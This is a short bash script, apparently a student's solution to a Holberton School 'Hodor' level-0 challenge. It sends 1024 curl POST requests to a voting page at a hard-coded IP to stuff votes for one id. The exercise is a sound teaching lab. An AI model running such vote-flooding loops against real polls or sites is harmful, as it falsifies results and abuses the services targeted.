#!/bin/bash

### Solution in Shell Script for Hodor Project by Julien Barbier - Holberton School
### Using curl command and its default 'keep-alive' connection.

URL=http://173.246.108.142/level0.php
HEADERS='User-Agent: havk64 - Curl requests'
ID='id=23'
COUNT=0
VOTES=1024

### Voting 1024 times:
while [ $COUNT -lt $VOTES ]
do
    curl -s -d "$ID&holdthedoor=submit" -H "$HEADERS"  $URL -o /dev/null
    echo "Vote: "$COUNT
    ((COUNT++))
done


